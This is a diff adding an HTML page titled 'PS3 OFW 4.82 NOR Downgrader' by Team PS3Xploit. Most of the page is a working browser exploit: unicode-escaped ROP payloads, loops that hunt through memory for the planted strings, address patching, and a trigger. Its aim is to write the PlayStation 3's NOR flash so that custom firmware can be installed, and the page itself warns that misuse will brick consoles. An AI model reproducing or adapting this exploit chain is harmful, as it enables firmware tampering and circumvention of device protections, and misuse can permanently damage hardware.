@@ -1,0 +1,260 @@
+<html>
+<script src="xp_rel_writer10.js"></script>
+<head>
+<script>
+var t_out=0;
+var total_loops=0;
+var fwCompat = ["4.82"];
+function initROP()
+{
+	try
+	{
+		t_out=0;
+		total_loops++;
+		var max_loops=10;
+		if(document.getElementById("load-rop").disabled==false){document.getElementById("load-rop").disabled=true;}
+		var fail_msg1="<h1><b>Triggering exploit FAILED - Reloading, please wait...</b></h1>";
+		var fail_msg2="<hr><h1><b>Triggering exploit FAILED ";
+		var fail_msg3=" times - Refresh the page...</b></h1><hr>";
+		var success_msg="<h1><b><font color=%22386E38%22><hr>SUCCESS...</font></b></h1><br><h3><b><font color=%22000000%22>Wait a few minutes until console beeps & shuts down!</font></b></h3><hr>"
+		var log_div = logEntry();
+		var usb_fp,stack_frame,jump_2,jump_1;
+		var usb_fp_addr=0,stack_frame_addr=0,jump_2_addr=0,jump_1_addr=0;
+		var usb_fp_bytecount=0x26*2;
+		var stack_frame_bytecount=0x5C0*2;
+		var jump_2_bytecount=0x24*2;
+		var jump_1_bytecount=0x4*2;
+		var search_max_threshold = 20*0x100000;
+		var search_base_offset = 0x80180000;
+		var search_range_size = 0xF8000;
+		var ph = 0x7EFD;		
+		
+		usb_fp=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u666C\u7368\u2E68\u6578\u0000\u7262\u0000\u0000\u4141");
+		usb_fp+=unescape("\u4141\u4141\u4141\u000D\u9684\u006F\u5550\u0000\uFFFF\uFFFF\u4141\u4141\u4141\u4141\u4141\u4141");
+		usb_fp+=unescape("\u0042\u3854\u006F\u5550\u4141\uFD7E");
+		
+		do
+		{
+			if(search_max_threshold<search_range_size){
+			if(total_loops<max_loops){document.getElementById('result').innerHTML=fail_msg1;t_out=setTimeout(initROP,1000);}
+			else{total_loops=0;document.getElementById('result').innerHTML=fail_msg2+max_loops.toString()+fail_msg3;}
+			return;}
+			usb_fp=usb_fp.replaceAt(0x000/2,hexh2bin(ph));
+			usb_fp_addr=findJsVariableOffset("usb_fp",usb_fp,search_base_offset,search_range_size,ph,usb_fp_bytecount/2, log_div);
+			search_max_threshold-=search_range_size;
+		}while(usb_fp_addr==0);		
+		
+		var readlen_io=usb_fp_addr-0x30;
+		var readlen_addr=usb_fp_addr-0x12;
+		var dev_handle_addr=usb_fp_addr-0x8;
+		var usb_fp_addr=usb_fp_addr+0x00;
+		var wb_addr=usb_fp_addr+0x16;
+		var sso_addr=usb_fp_addr+0x24;
+		var sso2_addr=usb_fp_addr+0x3e;
+		var rosdump_addr=0x8D000000;
+		var rosdump_addr2=0x8D000000+0x200000;
+		var rosflash_addr=0x8D000000+0x20;
+		var rosflash_addr2=0x8D000000+0x200000+0x20;
+
+		stack_frame= unescape("\u0102\u0009\u7604\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364")
+					+unescape("\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0060\uEF38\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192")
+					+unescape("\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556")
+					+unescape("\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\u8033\u84FA\u0000\u0000\uFF03\uFF03\u8033\u8526\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\uFF29\uFF29\uFF29")
+					+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0100\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u0000\u0000\u0019\uD3B0\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384")
+					+unescape("\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u8586\u8788")
+					+unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u0100\u0000\u0000\u0004\u7576\u7778\u7980\u8182\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112")
+					+unescape("\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576")
+					+unescape("\u7778\u7980\u8182\u0000\u025A\uFF10\uFF10\u8033\u84F0\u8033\u853E\u0010\u0000\u0000\u0000\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29")
+					+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8033\u84FA\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u000D\uB054\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304")
+					+unescape("\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768")
+					+unescape("\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A00\u0200\u0000\u0000\u2121\u2121\u0000\u0000\u2121\u2121\u0000\u0000\u0062\u8F30\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132")
+					+unescape("\u3334\u0000\u0000\u0060\uEF38\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596")
+					+unescape("\u9798\u9900\u0102\u0304\u0506\u0000\u0259\u1112\u1314\u0000\u0000\u0030\u6000\u0000\u0000\u2121\u2121\u0000\u0000\u2121\u2121\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u8033")
+					+unescape("\u84FA\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u0019\uD3AC\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324")
+					+unescape("\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000\u2121\u2121\u0000\u0000\u2121\u2121\u7576\u7778\u7980\u8182\uFFFF\uFFFF\uFFFF")
+					+unescape("\uFFFF\u0000\u0000\u2121\u2121\u0000\u0000\u2121\u2121\u4344\u4546\u4748\u4950\u0000\u0000\u8A05\u0000\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000\u0047\u5134\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA")
+					+unescape("\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\u0000\u0000\u8A03\u0000\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\u0000\u0000\u8A05")
+					+unescape("\u0000\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00\u0000\u025B\uFF10\uFF10\u8A00")
+					+unescape("\u0000\u2121\u2121\u0000\u1000\u0000\u0601\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u2121")
+					+unescape("\u2121\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A05")
+					+unescape("\u0000\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00\u0000\u025B\uFF10\uFF10\u8A00")
+					+unescape("\u0000\u2121\u2121\u0000\u0802\u0000\u1601\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8033")
+					+unescape("\u84FA\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A00")
+					+unescape("\u0200\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00\u0000\u025B\uFF10\uFF10\u8A00")
+					+unescape("\u0000\u2121\u2121\u0000\u1000\u0000\u3E01\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u2121")
+					+unescape("\u2121\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A05")
+					+unescape("\u0000\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u0060\uEF38\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00\u0000\u025B\uFF10\uFF10\u8A00")
+					+unescape("\u0000\u2121\u2121\u0000\u0802\u0000\u4E01\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8033")
+					+unescape("\u84FA\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A00")
+					+unescape("\u0200\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u000C\u5234\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00\u0000\u025B\uFF10\uFF10\u8033")
+					+unescape("\u84F0\u8033\u853E\u0000\u0800\u0000\u1001\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u2121")
+					+unescape("\u2121\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC778\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A00")
+					+unescape("\u0200\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u2F2A");
+		
+		stack_frame=stack_frame.replaceAt(0x11a/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x11C/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x126/2,hexh2bin(sso_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x128/2,hexh2bin(sso_addr));
+		stack_frame=stack_frame.replaceAt(0x28E/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x290/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x3BE/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x3C0/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x44e/2,hexh2bin(wb_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x450/2,hexh2bin(wb_addr));
+		stack_frame=stack_frame.replaceAt(0x572/2,hexh2bin(usb_fp_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x574/2,hexh2bin(usb_fp_addr));		
+		stack_frame=stack_frame.replaceAt(0x446/2,hexh2bin(usb_fp_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x448/2,hexh2bin(usb_fp_addr));
+		stack_frame=stack_frame.replaceAt(0x25a/2,hexh2bin(rosdump_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x25c/2,hexh2bin(rosdump_addr));	
+		stack_frame=stack_frame.replaceAt(0x252/2,hexh2bin(readlen_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x254/2,hexh2bin(readlen_addr));
+		stack_frame=stack_frame.replaceAt(0x316/2,hexh2bin(usb_fp_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x318/2,hexh2bin(usb_fp_addr));
+		stack_frame=stack_frame.replaceAt(0x266/2,hexh2bin(sso2_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x268/2,hexh2bin(sso2_addr));	
+		stack_frame=stack_frame.replaceAt(0x31e/2,hexh2bin(wb_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x320/2,hexh2bin(wb_addr));	
+		stack_frame=stack_frame.replaceAt(0x3a6/2,hexh2bin(rosdump_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x3a8/2,hexh2bin(rosdump_addr));
+		stack_frame=stack_frame.replaceAt(0x42e/2,hexh2bin(wb_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x430/2,hexh2bin(wb_addr));
+		stack_frame=stack_frame.replaceAt(0x426/2,hexh2bin(usb_fp_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x428/2,hexh2bin(usb_fp_addr));
+		stack_frame=stack_frame.replaceAt(0x39e/2,hexh2bin(readlen_io>>16));
+		stack_frame=stack_frame.replaceAt(0x3a0/2,hexh2bin(readlen_io));
+		stack_frame=stack_frame.replaceAt(0x5bE/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x5c0/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x6fE/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x700/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x83E/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x840/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x97e/2,hexh2bin(dev_handle_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x980/2,hexh2bin(dev_handle_addr));
+		stack_frame=stack_frame.replaceAt(0x582/2,hexh2bin(rosflash_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x584/2,hexh2bin(rosflash_addr));
+		stack_frame=stack_frame.replaceAt(0x6c2/2,hexh2bin(rosflash_addr2>>16));
+		stack_frame=stack_frame.replaceAt(0x6c4/2,hexh2bin(rosflash_addr2));
+		stack_frame=stack_frame.replaceAt(0x802/2,hexh2bin(rosflash_addr>>16));
+		stack_frame=stack_frame.replaceAt(0x804/2,hexh2bin(rosflash_addr));
+		stack_frame=stack_frame.replaceAt(0x942/2,hexh2bin(rosflash_addr2>>16));
+		stack_frame=stack_frame.replaceAt(0x944/2,hexh2bin(rosflash_addr2));
+		
+		ph = 0x2A2F;
+		do
+		{
+			if(search_max_threshold<search_range_size){
+			if(total_loops<max_loops){document.getElementById('result').innerHTML=fail_msg1;t_out=setTimeout(initROP,1000);}
+			else{total_loops=0;document.getElementById('result').innerHTML=fail_msg2+max_loops.toString()+fail_msg3;}
+			return;}
+			stack_frame=stack_frame.replaceAt(0x000/2,hexh2bin(ph));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base_offset,search_range_size,ph,stack_frame_bytecount/2, log_div);
+			search_max_threshold-=search_range_size;
+		}while(stack_frame_addr==0);
+		
+		jump_2=unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950"); // 50 bytes
+		jump_2+=unescape("\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
+		jump_2=jump_2.replaceAt(0x32/2,hexh2bin(stack_frame_addr>>16));
+		jump_2=jump_2.replaceAt(0x34/2,hexh2bin(stack_frame_addr));	
+		
+		ph = 0x7EFB;
+		
+		do
+		{
+			if(search_max_threshold<search_range_size){
+			if(total_loops<max_loops){document.getElementById('result').innerHTML=fail_msg1;t_out=setTimeout(initROP,1000);}
+			else{total_loops=0;document.getElementById('result').innerHTML=fail_msg2+max_loops.toString()+fail_msg3;}
+			return;}
+			jump_2=jump_2.replaceAt(0x00/2,hexh2bin(ph));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,ph,jump_2_bytecount/2, log_div);
+			search_max_threshold-=search_range_size;
+		}while(jump_2_addr==0);
+		
+		jump_1=unescape("\u4141\u4141\u4141\uFA7E");
+		jump_1=jump_1.replaceAt(0x02/2,hexh2bin(jump_2_addr>>16));
+		jump_1=jump_1.replaceAt(0x04/2,hexh2bin(jump_2_addr));	
+		
+		ph = 0x7EFA;
+		do
+		{
+			if(search_max_threshold<search_range_size){
+			if(total_loops<max_loops){document.getElementById('result').innerHTML=fail_msg1;t_out=setTimeout(initROP,1000);}
+			else{total_loops=0;document.getElementById('result').innerHTML=fail_msg2+max_loops.toString()+fail_msg3;}
+			return;}
+			jump_1=jump_1.replaceAt(0x00/2,hexh2bin(ph));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,ph,jump_1_bytecount/2, log_div);
+			search_max_threshold-=search_range_size;
+		}while(jump_1_addr==0);
+		
+		if(t_out!=0){clearTimeout(t_out);}
+		document.getElementById('result').innerHTML=success_msg;
+		logAdd("Triggering exploit....<br>Processing to write to NOR Flash Memory... <br>Please wait, the console will shut down automatically in a few minutes...", log_div);
+		setTimeout(trigger,500,jump_1_addr);
+		
+		console.log(s2hex(usb_fp), log_div);
+		console.log(s2hex(stack_frame), log_div);
+		console.log(s2hex(jump_2), log_div);
+		console.log(s2hex(jump_1), log_div);
+	} 
+	catch(e) 
+	{
+		logAdd(e, log_div);
+	}
+}
+</script>
+</head>
+	<body id="BodyID" bgcolor="#FFD097">
+		<div id="HeaderID" style="color:#000000">
+		<h1>PS3 OFW 4.82 NOR Downgrader v1.0</h1>
+		<h3>by Team PS3Xploit</h3>
+		<font color="#000000">
+		<h2>Supports Official OFW Firmware ONLY!!! <font color="red">DO NOT USE ON CFW!</font></h2>
+		<h2>Supports Phat Models Hxx/Jxx/Kxx/Lxx/Mxx/Pxx/Qxx</h2>
+		<h2>Supports Slim Models 2xxx <font color="red">(minver 3.56 or lower ONLY, check with minverchk.pup)</font></h2>
+		</font>
+		<b>
+		<p>Courtesy of: <br>
+		W (Javascript, Research & Testing)<br>
+		esc0rtd3w (Debugging, Research & Testing)<br>
+		bguerville (ROP/Javascript & Debugging)<br/>
+		Habib (ROP & Debugging)<br/><br/></b>
+		Many thanks to xerpi (Memory leak exploit ps3 port),
+		zecoxao & Joonie for their early support, 
+		cmx for much invaluable information, 
+		mysis for documenting vsh/lv2, 
+		the psdevwiki team of course, 
+		STLcardsWS for his long standing contribution &
+		all ps3 community hackers/devs as a whole, you know who you are... LispyLeaf On YouTube For The Video Tutorial<br>
+		More details & news on <a href="http://www.psx-place.com">http://www.psx-place.com</a><br><hr>
+		</div>
+		<br>
+		<h2><font color="red"><b>** DO NOT USE THIS ON 3xxx/4xxx OR YOU WILL BRICK YOUR CONSOLE!!! **</font></b></h2>
+		<h2><font color="red"><b>** DO NOT POWER OFF THE CONSOLE ONCE STARTED. IT MAY RESULT IN BRICK! **</font></b></h2>
+		<h2><font color="red"><b>** MAKE SURE FLASH DRIVE IS IN FAR RIGHT SLOT WITH CORRECT FILE "flsh.hex" **</font></b></h2>
+		<br>
+		<h2><b>THIS MAY TAKE A FEW SECONDS TO A FEW MINUTES</b></h2></i><br>
+		<h2><b>Once PS3 has powered down, turn console on and install a 4.82 CFW.</b></h2>
+	<button id="load-rop" type="button" onclick="initROP();" autofocus>Write to NOR Flash Memory</button>
+	<div id="exploit" ></div><br>
+	<div id="result" style="color:#CC2010"></div><br>
+	<div id="log"></div><br>
+	<div id="trigger"></div><br>
+	<div id="footer" style="color:#000000"></div><br>
+	<script type="text/javascript" > 
+		writeEnvInfo(document.getElementById('footer'));
+		ps3chk();
+	</script>
+	</body>
+</html>
